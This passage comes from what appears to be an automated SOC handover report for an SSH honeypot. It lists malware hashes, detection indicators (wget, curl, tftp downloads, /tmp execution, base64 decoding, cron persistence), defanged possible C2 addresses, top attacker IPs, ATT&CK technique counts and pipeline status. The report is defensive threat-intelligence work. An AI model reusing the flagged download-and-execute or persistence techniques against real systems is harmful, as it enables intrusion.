| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `73.222.233[.]25` | US | Comcast Cable Communications, Inc. | **100** ⚠️ | 1 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `66.132.172[.]204` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `115.190.51[.]71` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `91.211.95[.]158` | RU | AVANT Ltd. | **100** ⚠️ | 2 |
| `172.190.51[.]254` | US | Microsoft Limited | **100** ⚠️ | 33 |
| `40.82.214[.]8` | AU | Microsoft Corporation | **100** ⚠️ | 50 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `117.89.249[.]222` | CN | CHINANET jiangsu province network | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 83 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 81 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 24 below threshold 25 | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 115 cases |
| Tool 34  | Credential Extractor        | ✅ 110 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 40 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 83 priority case(s) shown individually · 19 recon entry/entries in table (6 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-30T20:13:17Z_
